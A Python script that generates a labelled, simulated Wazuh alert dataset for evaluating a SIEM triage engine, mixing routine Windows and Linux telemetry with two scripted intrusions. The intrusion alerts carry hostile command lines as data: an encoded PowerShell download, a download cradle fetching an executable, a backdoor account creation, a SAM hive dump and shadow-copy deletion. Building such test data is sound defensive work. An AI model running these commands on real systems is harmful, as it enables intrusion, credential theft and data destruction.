"""
Builds eval/wazuh_dataset.json: labelled alerts in the exact shape Wazuh
writes to alerts.json.

    python -m eval.build_wazuh_dataset

Rule ids, levels, descriptions, groups and MITRE ids are copied from the
stock Wazuh 4.14 ruleset (ruleset/rules/*.xml), so each alert here is one the
real manager can raise. The event payloads are written by hand to match what
the Windows agent, Sysmon and the Linux log collector send. Hosts, users and
the client are invented.

What the set is for: checking the two numbers that matter on a SIEM-shaped
stream, where most alerts are routine telemetry, benchmark results and health
events rather than attacks.

  label.threat = True    an attack step. Must reach a human.
  label.threat = False   routine. Should be closed, with a reason.
  label.threat = None    a judgement call (a new service, one failed login).
                         Not scored either way.

It is a simulated set, written by the same people who wrote the engine. The
"holdout" split was written once and not tuned against, which is weaker than
an independent test. The real test is a live Wazuh stream.
"""
import json
import os

HERE = os.path.dirname(__file__)
CLIENT = "Sahyadri Co-operative Bank"
MANAGER = "wazuh-server"
LAPTOP = {"id": "001", "name": "SCB-BR2-WKS-014", "ip": "10.20.4.37"}
SERVER = {"id": "000", "name": MANAGER}
WIN_USER = "a.kulkarni"

# id: (level, description, groups, mitre ids) — from the Wazuh 4.14 ruleset
RULES = {
    "503": (3, "Wazuh agent started.", ["ossec"], []),
    "506": (3, "Wazuh agent stopped.", ["ossec"], ["T1562.001"]),
    "533": (7, "Listened ports status (netstat) changed (new port opened or closed).", ["ossec"], []),
    "550": (7, "Integrity checksum changed.", ["ossec", "syscheck", "syscheck_entry_modified", "syscheck_file"], ["T1565.001"]),
    "554": (5, "File added to the system.", ["ossec", "syscheck", "syscheck_entry_added", "syscheck_file"], []),
    "594": (5, "Registry Key Integrity Checksum Changed", ["ossec", "syscheck", "syscheck_entry_modified", "syscheck_registry"], ["T1565.001", "T1112"]),
    "2902": (7, "New dpkg (Debian Package) installed.", ["syslog", "dpkg", "config_changed"], []),
    "5402": (3, "Successful sudo to ROOT executed.", ["syslog", "sudo"], ["T1548.003"]),
    "5501": (3, "PAM: Login session opened.", ["pam", "syslog", "authentication_success"], ["T1078"]),
    "5502": (3, "PAM: Login session closed.", ["pam", "syslog"], []),
    "5701": (8, "sshd: Possible attack on the ssh server (or version gathering).", ["syslog", "sshd", "recon"], ["T1190"]),
    "5710": (5, "sshd: Attempt to login using a non-existent user", ["syslog", "sshd", "authentication_failed", "invalid_login"], ["T1110.001", "T1021.004"]),
    "5712": (10, "sshd: brute force trying to get access to the system. Non existent user.", ["syslog", "sshd", "authentication_failures"], ["T1110"]),
    "5715": (3, "sshd: authentication success.", ["syslog", "sshd", "authentication_success"], ["T1078", "T1021"]),
    "5716": (5, "sshd: authentication failed.", ["syslog", "sshd", "authentication_failed"], ["T1110"]),
    "5763": (10, "sshd: brute force trying to get access to the system. Authentication failed.", ["syslog", "sshd", "authentication_failures"], ["T1110"]),
    "19004": (7, "SCA summary: {policy}: Score less than 50% ({score})", ["sca"], []),
    "19007": (7, "{policy}: {title}", ["sca"], []),
    "19008": (3, "{policy}: {title}", ["sca"], []),
    "19011": (9, "{policy}: {title}: Status changed from passed to failed", ["sca"], []),
    "23504": (7, "{cve} affects {package}", ["vulnerability-detector"], []),
    "23505": (10, "{cve} affects {package}", ["vulnerability-detector"], []),
    "23506": (13, "{cve} affects {package}", ["vulnerability-detector"], []),
    "60014": (10, "Multiple Windows error events.", ["windows"], []),
    "60106": (3, "Windows Logon Success", ["windows", "windows_security", "authentication_success"], ["T1078"]),
    "60109": (8, "User account enabled or created", ["windows", "windows_security", "adduser", "account_changed"], ["T1098"]),
    "60116": (7, "Windows is shutting down", ["windows", "windows_security", "system_shutdown"], ["T1529"]),
    "60117": (9, "Windows audit log was cleared", ["windows", "windows_security", "logs_cleared"], ["T1070.004"]),
    "60118": (3, "Windows Workstation Logon Success", ["windows", "windows_security", "authentication_success"], ["T1078"]),
    "60122": (5, "Logon Failure - Unknown user or bad password", ["windows", "windows_security", "authentication_failed"], ["T1531"]),
    "60137": (3, "Windows User Logoff", ["windows", "windows_security"], []),
    "60154": (12, "Administrators Group Changed", ["windows", "windows_security", "group_changed", "win_group_changed"], ["T1484"]),
    "60602": (9, "Windows application error event.", ["windows", "windows_application", "system_error"], []),
    "60608": (4, "Summary event of the report's signatures.", ["windows", "windows_application"], []),
    "60642": (3, "Software protection service scheduled successfully.", ["windows", "windows_application"], []),
    "60807": (3, "The database engine is initiating recovery steps.", ["windows", "windows_application"], []),
    "61102": (5, "Windows System error event", ["windows", "windows_system", "system_error"], []),
    "61104": (3, "Service startup type was changed", ["windows", "windows_system", "policy_changed"], []),
    "61110": (10, "Multiple System error events", ["windows", "windows_system"], []),
    "61138": (5, "New Windows Service Created", ["windows", "windows_system"], ["T1543.003"]),
    "62107": (3, "Windows Defender: Antimalware scan started", ["windows", "windows_defender"], []),
    "62123": (12, "Windows Defender: Antimalware platform detected {sev} potentially unwanted software ({proc})", ["windows", "windows_defender"], []),
    "62130": (3, "Windows Defender: Antimalware definitions updated successfully", ["windows", "windows_defender"], []),
    "92026": (14, "Reg.exe used to dump SAM hive", ["sysmon", "sysmon_eid1_detections", "windows"], ["T1003.002"]),
    "92027": (4, "Powershell process spawned powershell instance", ["sysmon", "sysmon_eid1_detections", "windows"], ["T1059.001"]),
    "92031": (3, "Discovery activity executed", ["sysmon", "sysmon_eid1_detections", "windows"], ["T1087"]),
    "92039": (3, "A net.exe account discovery command was initiated", ["sysmon", "sysmon_eid1_detections", "windows"], ["T1087"]),
    "92040": (12, "{orig} executed a user creation command", ["sysmon", "sysmon_eid1_detections", "windows"], ["T1136.001"]),
    "92052": (4, "Windows command prompt started by an abnormal process", ["sysmon", "sysmon_eid1_detections", "windows"], ["T1059.003"]),
    "92057": (12, "Powershell.exe spawned a powershell process which executed a base64 encoded command", ["sysmon", "sysmon_eid1_detections", "windows"], ["T1059.001"]),
    "92213": (15, "Executable file dropped in folder commonly used by malware", ["sysmon", "sysmon_eid11_detections", "windows"], ["T1105"]),
    "92302": (6, "Registry entry to be executed on next logon was modified using command line application reg.exe", ["sysmon", "sysmon_eid13_detections", "windows"], ["T1547.001"]),
    "92403": (12, "Local Security Authority Subsystem Service (LSASS) process was accessed by {src}, possible code injection for credential dumping", ["sysmon", "sysmon_eid8_detections", "windows"], ["T1055"]),
}

# technique id -> (name, tactics), as Wazuh enriches rule.mitre
MITRE = {
    "T1003.002": ("Security Account Manager", ["Credential Access"]),
    "T1021": ("Remote Services", ["Lateral Movement"]),
    "T1021.004": ("SSH", ["Lateral Movement"]),
    "T1055": ("Process Injection", ["Defense Evasion", "Privilege Escalation"]),
    "T1059.001": ("PowerShell", ["Execution"]),
    "T1059.003": ("Windows Command Shell", ["Execution"]),
    "T1070.004": ("File Deletion", ["Defense Evasion"]),
    "T1078": ("Valid Accounts", ["Defense Evasion", "Persistence", "Privilege Escalation", "Initial Access"]),
    "T1087": ("Account Discovery", ["Discovery"]),
    "T1098": ("Account Manipulation", ["Persistence", "Privilege Escalation"]),
    "T1105": ("Ingress Tool Transfer", ["Command and Control"]),
    "T1110": ("Brute Force", ["Credential Access"]),
    "T1110.001": ("Password Guessing", ["Credential Access"]),
    "T1112": ("Modify Registry", ["Defense Evasion"]),
    "T1136.001": ("Local Account", ["Persistence"]),
    "T1190": ("Exploit Public-Facing Application", ["Initial Access"]),
    "T1484": ("Domain or Tenant Policy Modification", ["Defense Evasion", "Privilege Escalation"]),
    "T1529": ("System Shutdown/Reboot", ["Impact"]),
    "T1531": ("Account Access Removal", ["Impact"]),
    "T1543.003": ("Windows Service", ["Persistence", "Privilege Escalation"]),
    "T1547.001": ("Registry Run Keys / Startup Folder", ["Persistence", "Privilege Escalation"]),
    "T1548.003": ("Sudo and Sudo Caching", ["Privilege Escalation", "Defense Evasion"]),
    "T1562.001": ("Disable or Modify Tools", ["Defense Evasion"]),
    "T1565.001": ("Stored Data Manipulation", ["Impact"]),
}

ITEMS = []
_seq = [0]


def _rule(rid, **fmt):
    level, desc, groups, mitre_ids = RULES[rid]
    rule = {"level": level, "description": desc.format(**fmt) if fmt else desc, "id": rid,
            "firedtimes": 1, "mail": level >= 12, "groups": list(groups)}
    if mitre_ids:
        tactics = []
        for t in mitre_ids:
            for name in MITRE[t][1]:
                if name not in tactics:
                    tactics.append(name)
        rule["mitre"] = {"id": list(mitre_ids), "tactic": tactics,
                         "technique": [MITRE[t][0] for t in mitre_ids]}
    return rule


def _add(raw, threat, scenario, split, why=""):
    ITEMS.append({"source": "wazuh", "client": CLIENT, "raw": raw,
                  "label": {"threat": threat, "scenario": scenario, "split": split, "why": why}})


def _base(rid, agent, ts, location, **fmt):
    _seq[0] += 1
    return {"timestamp": ts.replace("Z", ".000+0000"), "rule": _rule(rid, **fmt), "agent": dict(agent),
            "manager": {"name": MANAGER}, "id": f"1763800000.{_seq[0]:07d}", "location": location}


def win(rid, ts, channel, provider, event_id, eventdata, label, scenario, split, why="", **fmt):
    raw = _base(rid, LAPTOP, ts, "EventChannel", **fmt)
    raw["decoder"] = {"name": "windows_eventchannel"}
    raw["data"] = {"win": {"system": {
        "providerName": provider, "eventID": str(event_id), "channel": channel,
        "computer": LAPTOP["name"], "systemTime": ts, "severityValue": "INFORMATION",
        # the long Windows message is deliberately full of strings that must NOT
        # be matched as evidence (paths, privilege names)
        "message": "\"Event recorded by " + provider + ". Process Name: C:\\Windows\\System32\\lsass.exe\""},
        "eventdata": eventdata}}
    _add(raw, label, scenario, split, why)


def sysmon(rid, ts, event_id, eventdata, label, scenario, split, why="", **fmt):
    ed = {"utcTime": ts.replace("T", " ").replace("Z", ".000"), "user": f"SCB\\{WIN_USER}"}
    ed.update(eventdata)
    win(rid, ts, "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon", event_id, ed,
        label, scenario, split, why, **fmt)


def proc(rid, ts, image, cmdline, parent, label, scenario, split, why="", **fmt):
    sysmon(rid, ts, 1, {
        "image": image, "commandLine": cmdline, "parentImage": parent,
        "originalFileName": image.rsplit("\\", 1)[-1], "integrityLevel": "High",
        "hashes": "MD5=0C4F1E0A4A1B3F5E2D7C9B8A6F5E4D3C,SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08",
    }, label, scenario, split, why, **fmt)


def logon(ts, target, logon_type, label=False, split="dev"):
    win("60106", ts, "Security", "Microsoft-Windows-Security-Auditing", 4624, {
        "subjectUserName": LAPTOP["name"] + "$", "subjectDomainName": "SCB",
        "targetUserName": target, "targetDomainName": "NT AUTHORITY" if target == "SYSTEM" else "SCB",
        "logonType": str(logon_type), "logonProcessName": "Advapi", "ipAddress": "-",
        "processName": "C:\\Windows\\System32\\services.exe"}, label, "routine", split)


POLICY = "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0"


def sca(rid, ts, title, result, label, split, previous=None, why=""):
    raw = _base(rid, LAPTOP, ts, "sca", policy=POLICY, title=title)
    raw["decoder"] = {"name": "sca"}
    check = {"id": str(26000 + _seq[0]), "title": title, "result": result,
             "description": "Benchmark check.", "remediation": "Set the policy as recommended."}
    if previous:
        check["previous_result"] = previous
    raw["data"] = {"sca": {"type": "check", "scan_id": "771", "policy": POLICY, "check": check}}
    _add(raw, label, "posture", split, why)


def vuln(rid, ts, cve, package, sev, split):
    raw = _base(rid, LAPTOP, ts, "vulnerability-detector", cve=cve, package=package)
    raw["decoder"] = {"name": "json"}
    raw["data"] = {"vulnerability": {"cve": cve, "severity": sev, "status": "Active",
                                     "package": {"name": package, "version": "1.0", "condition": "Package less than 2.0"}}}
    _add(raw, False, "posture", split)


def fim(rid, ts, path, event, label, split):
    raw = _base(rid, LAPTOP, ts, "syscheck")
    raw["decoder"] = {"name": "syscheck_registry_value_set" if "HKEY" in path else "syscheck_integrity_changed"}
    raw["syscheck"] = {"path": path, "event": event, "mode": "scheduled",
                       "sha256_after": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"}
    _add(raw, label, "routine", split)


def syslog(rid, ts, full_log, data, label, scenario, split, location="/var/log/auth.log", why=""):
    raw = _base(rid, SERVER, ts, location)
    raw["full_log"] = full_log
    raw["decoder"] = {"name": "sshd" if "sshd" in full_log else "pam"}
    if data:
        raw["data"] = data
    _add(raw, label, scenario, split, why)


PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
CMD = "C:\\Windows\\System32\\cmd.exe"
NET = "C:\\Windows\\System32\\net.exe"
NET1 = "C:\\Windows\\System32\\net1.exe"
REG = "C:\\Windows\\System32\\reg.exe"
EXPLORER = "C:\\Windows\\explorer.exe"


def build():
    D = "2026-11-22T"

    # ---- routine Windows telemetry: the bulk of a real stream ----------------
    logon(D + "03:30:02Z", "SYSTEM", 5)
    logon(D + "03:30:09Z", "SYSTEM", 5)
    logon(D + "03:31:40Z", WIN_USER, 2)
    logon(D + "03:44:10Z", "SYSTEM", 5, split="holdout")
    logon(D + "04:10:55Z", WIN_USER, 11, split="holdout")
    win("60118", D + "03:31:41Z", "Security", "Microsoft-Windows-Security-Auditing", 4624,
        {"targetUserName": WIN_USER, "targetDomainName": "SCB", "logonType": "7", "ipAddress": "127.0.0.1"},
        False, "routine", "dev")
    win("60137", D + "03:58:00Z", "Security", "Microsoft-Windows-Security-Auditing", 4634,
        {"targetUserName": WIN_USER, "targetDomainName": "SCB", "logonType": "2"}, False, "routine", "dev")
    for i, ts in enumerate(("03:30:20Z", "03:30:21Z", "03:35:00Z", "04:40:11Z")):
        win("61104", D + ts, "System", "Service Control Manager", 7040,
            {"param1": "Background Intelligent Transfer Service", "param2": "auto start", "param3": "demand start"},
            False, "routine", "dev" if i < 2 else "holdout")
    win("60642", D + "03:32:00Z", "Application", "Microsoft-Windows-Security-SPP", 16384, {}, False, "routine", "dev")
    win("60608", D + "03:33:00Z", "Application", "Windows Error Reporting", 1001, {}, False, "routine", "holdout")
    win("60807", D + "03:30:30Z", "Application", "ESENT", 300, {}, False, "routine", "dev",
        why="'recovery' here is a database replaying its log, not boot recovery being switched off")
    win("62107", D + "04:00:00Z", "Microsoft-Windows-Windows Defender/Operational",
        "Microsoft-Windows-Windows Defender", 1000, {}, False, "routine", "dev",
        why="'Antimalware' must not match the word 'malware'")
    win("62130", D + "04:05:00Z", "Microsoft-Windows-Windows Defender/Operational",
        "Microsoft-Windows-Windows Defender", 2000, {}, False, "routine", "holdout")
    for rid, loc in (("503", "wazuh-agent"), ("506", "wazuh-agent")):
        raw = _base(rid, LAPTOP, D + "03:30:00Z", loc)
        raw["full_log"] = "ossec: Agent started: 'SCB-BR2-WKS-014->any'."
        _add(raw, False, "routine", "dev")
    fim("594", D + "03:40:00Z", "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\BITS", "modified", False, "dev")
    fim("554", D + "03:40:02Z", "c:\\programdata\\microsoft\\windows\\start menu\\programs\\teams.lnk", "added", False, "holdout")

    # ---- health events: not security detections --------------------------------
    win("60602", D + "03:36:00Z", "Application", "Application Error", 1000, {}, False, "health", "dev")
    win("60602", D + "04:36:00Z", "Application", "Application Hang", 1002, {}, False, "health", "holdout")
    win("61102", D + "03:37:00Z", "System", "DCOM", 10016, {}, False, "health", "dev")
    win("61110", D + "03:37:30Z", "System", "DCOM", 10016, {}, False, "health", "dev")
    win("60014", D + "03:38:00Z", "Application", "Application Error", 1000, {}, False, "health", "holdout")
    win("60116", D + "05:59:00Z", "Security", "Microsoft-Windows-Security-Auditing", 4609, {}, False, "health", "dev")

    # ---- posture: benchmark results and vulnerability findings -----------------
    sca("19007", D + "03:31:00Z", "Ensure 'Enforce password history' is set to '24 or more password(s)'.", "failed", False, "dev")
    sca("19007", D + "03:31:01Z", "Ensure 'Configure LSASS to run as a protected process' is set to 'Enabled'.", "failed", False, "dev",
        why="the title names LSASS because it is the name of a check, not activity")
    sca("19007", D + "03:31:02Z", "Ensure 'Turn off Microsoft Defender AntiVirus' is set to 'Disabled' (protects against malware).", "failed", False, "dev")
    sca("19007", D + "03:31:03Z", "Ensure 'Audit Logon' is set to 'Success and Failure'.", "failed", False, "holdout")
    sca("19007", D + "03:31:04Z", "Ensure 'Exploit Protection' settings limit privilege escalation.", "failed", False, "holdout",
        why="check title contains 'privilege escalation'")
    sca("19008", D + "03:31:05Z", "Ensure 'Windows Firewall: Domain: Firewall state' is set to 'On'.", "passed", False, "dev")
    sca("19008", D + "03:31:06Z", "Ensure 'Minimum password length' is set to '14 or more character(s)'.", "passed", False, "holdout")
    raw = _base("19004", LAPTOP, D + "03:31:10Z", "sca", policy=POLICY, score="38")
    raw["data"] = {"sca": {"type": "summary", "policy": POLICY, "score": "38", "passed": "152", "failed": "247"}}
    _add(raw, False, "posture", "dev")
    vuln("23504", D + "03:45:00Z", "CVE-2025-21204", "Microsoft Windows 11", "Medium", "dev")
    vuln("23505", D + "03:45:01Z", "CVE-2026-0211", "Google Chrome", "High", "dev")
    vuln("23506", D + "03:45:02Z", "CVE-2026-1142", "7-Zip", "Critical", "holdout")
    # a control that was passing and now fails is a change, not a state
    sca("19011", D + "09:20:00Z", "Ensure 'Windows Firewall: Private: Firewall state' is set to 'On'.", "failed", None, "dev",
        previous="passed", why="drift: someone or something turned the firewall off")

    # ---- routine Linux server activity -----------------------------------------
    syslog("5501", D + "03:20:00Z", "Nov 22 03:20:00 wazuh-server sshd[811]: pam_unix(sshd:session): session opened for user ops(uid=1001) by (uid=0)",
           {"dstuser": "ops"}, False, "routine", "dev")
    syslog("5715", D + "03:20:00Z", "Nov 22 03:20:00 wazuh-server sshd[811]: Accepted publickey for ops from 10.20.0.5 port 50112 ssh2",
           {"srcip": "10.20.0.5", "dstuser": "ops"}, False, "routine", "dev")
    syslog("5402", D + "03:21:10Z", "Nov 22 03:21:10 wazuh-server sudo: ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/systemctl status wazuh-manager",
           {"srcuser": "ops", "dstuser": "root", "command": "/usr/bin/systemctl status wazuh-manager"}, False, "routine", "holdout")
    syslog("5502", D + "03:50:00Z", "Nov 22 03:50:00 wazuh-server sshd[811]: pam_unix(sshd:session): session closed for user ops",
           {"dstuser": "ops"}, False, "routine", "holdout")
    syslog("2902", D + "06:25:00Z", "2026-11-22 06:25:00 status installed libssl3:amd64 3.0.2-0ubuntu1.20", None, None, "change", "dev",
           location="/var/log/dpkg.log", why="a package install: a change someone should be able to account for")

    # ---- judgement calls ---------------------------------------------------------
    win("61138", D + "04:15:00Z", "System", "Service Control Manager", 7045,
        {"serviceName": "GoogleUpdaterService", "imagePath": "C:\\Program Files (x86)\\Google\\GoogleUpdater\\updater.exe",
         "serviceType": "user mode service", "startType": "auto start"}, None, "change", "dev")
    proc("92031", D + "04:20:00Z", "C:\\Windows\\System32\\whoami.exe", "whoami /groups", CMD, None, "discovery", "dev",
         why="discovery commands are what admins and attackers both run")

    # ---- the internet knocking on the server: real, constant, and it adds up ----
    attacker = "203.0.113.77"
    for i, (user, ts) in enumerate((("admin", "07:01:02Z"), ("oracle", "07:01:04Z"), ("test", "07:01:07Z"))):
        syslog("5710", D + ts, f"Nov 22 {ts[:8]} wazuh-server sshd[90{i}]: Invalid user {user} from {attacker} port 4{i}112",
               {"srcip": attacker, "srcuser": user}, None, "ssh-bruteforce", "dev",
               why="one failed login is noise; the pattern is the alert")
    syslog("5712", D + "07:01:10Z", f"Nov 22 07:01:10 wazuh-server sshd[909]: Invalid user ubuntu from {attacker} port 48112",
           {"srcip": attacker, "srcuser": "ubuntu"}, True, "ssh-bruteforce", "dev")
    syslog("5716", D + "07:02:00Z", f"Nov 22 07:02:00 wazuh-server sshd[915]: Failed password for root from {attacker} port 49001 ssh2",
           {"srcip": attacker, "dstuser": "root"}, None, "ssh-bruteforce", "dev")
    syslog("5763", D + "07:02:30Z", f"Nov 22 07:02:30 wazuh-server sshd[921]: Failed password for root from {attacker} port 49044 ssh2",
           {"srcip": attacker, "dstuser": "root"}, True, "ssh-bruteforce", "holdout")
    syslog("5701", D + "07:05:00Z", "Nov 22 07:05:00 wazuh-server sshd[930]: Bad protocol version identification 'GET / HTTP/1.1' from 198.51.100.200 port 40022",
           {"srcip": "198.51.100.200"}, True, "ssh-probe", "holdout")

    # ---- hands-on-keyboard on the workstation (dev) -----------------------------
    proc("92057", D + "10:02:10Z", PS,
         "\"powershell.exe\" -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
         PS, True, "intrusion", "dev")
    proc("92031", D + "10:02:40Z", "C:\\Windows\\System32\\whoami.exe", "whoami /all", PS, None, "intrusion", "dev",
         why="recon inside an intrusion; closed on its own, kept as context")
    proc("92039", D + "10:02:55Z", NET, "net localgroup administrators", PS, None, "intrusion", "dev")
    proc("92027", D + "10:03:20Z", PS,
         "powershell.exe -c \"Invoke-WebRequest -Uri http://198.51.100.44/u.bin -OutFile C:\\Users\\Public\\svc_update.exe\"",
         PS, True, "intrusion", "dev", why="Wazuh rates this level 4; the command line is a download cradle")
    sysmon("92213", D + "10:03:24Z", 11, {"image": PS, "targetFilename": "C:\\Users\\Public\\svc_update.exe"},
           True, "intrusion", "dev")
    proc("92040", D + "10:04:05Z", NET1, "C:\\Windows\\system32\\net1 user svc_backup P@ssw0rd!23 /add", NET,
         True, "intrusion", "dev", orig="net1.exe")
    win("60109", D + "10:04:05Z", "Security", "Microsoft-Windows-Security-Auditing", 4720,
        {"subjectUserName": WIN_USER, "subjectDomainName": "SCB", "targetUserName": "svc_backup",
         "targetDomainName": LAPTOP["name"]}, True, "intrusion", "dev")
    win("60154", D + "10:04:30Z", "Security", "Microsoft-Windows-Security-Auditing", 4732,
        {"subjectUserName": WIN_USER, "subjectDomainName": "SCB", "targetUserName": "Administrators",
         "memberSid": "S-1-5-21-1-2-3-1009"}, True, "intrusion", "dev")
    sysmon("92302", D + "10:05:00Z", 13, {
        "image": REG, "eventType": "SetValue",
        "targetObject": "HKU\\S-1-5-21-1-2-3-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        "details": "C:\\Users\\Public\\svc_update.exe"}, True, "intrusion", "dev",
        why="Wazuh rates run-key persistence level 6 (low)")

    # ---- a second intrusion, never tuned against (holdout) ------------------------
    proc("92026", D + "14:10:00Z", REG, "reg.exe save hklm\\sam C:\\Users\\Public\\s.hiv", CMD, True, "cred-theft", "holdout")
    sysmon("92403", D + "14:10:40Z", 8, {"sourceImage": "C:\\Users\\Public\\upd.exe",
                                         "targetImage": "C:\\Windows\\System32\\lsass.exe"},
           True, "cred-theft", "holdout", src="C:\\\\Users\\\\Public\\\\upd.exe")
    win("62123", D + "14:11:00Z", "Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-Windows Defender", 1116,
        {"threatName": "HackTool:Win32/Mimikatz!dha", "severityName": "Severe", "processName": "C:\\Users\\Public\\upd.exe",
         "path": "file:_C:\\Users\\Public\\upd.exe"}, True, "cred-theft", "holdout", sev="Severe", proc="C:\\\\Users\\\\Public\\\\upd.exe")
    proc("92052", D + "14:12:00Z", CMD, "cmd.exe /c vssadmin delete shadows /all /quiet", "C:\\Users\\Public\\upd.exe",
         True, "cred-theft", "holdout", why="Wazuh rates this level 4; the command deletes shadow copies")
    win("60117", D + "14:13:00Z", "Security", "Microsoft-Windows-Eventlog", 1102,
        {"subjectUserName": WIN_USER, "subjectDomainName": "SCB"}, True, "cred-theft", "holdout")
    for ts in ("14:20:01Z", "14:20:03Z"):
        win("60122", D + ts, "Security", "Microsoft-Windows-Security-Auditing", 4625,
            {"targetUserName": "Administrator", "logonType": "3", "ipAddress": "10.20.4.91"}, None, "cred-theft", "holdout")

    return ITEMS


if __name__ == "__main__":
    items = build()
    out = os.path.join(HERE, "wazuh_dataset.json")
    with open(out, "w") as f:
        json.dump(items, f, indent=1)
    t = sum(1 for i in items if i["label"]["threat"] is True)
    b = sum(1 for i in items if i["label"]["threat"] is False)
    print(f"wrote {out}: {len(items)} alerts ({t} threats, {b} routine, {len(items) - t - b} judgement calls)")
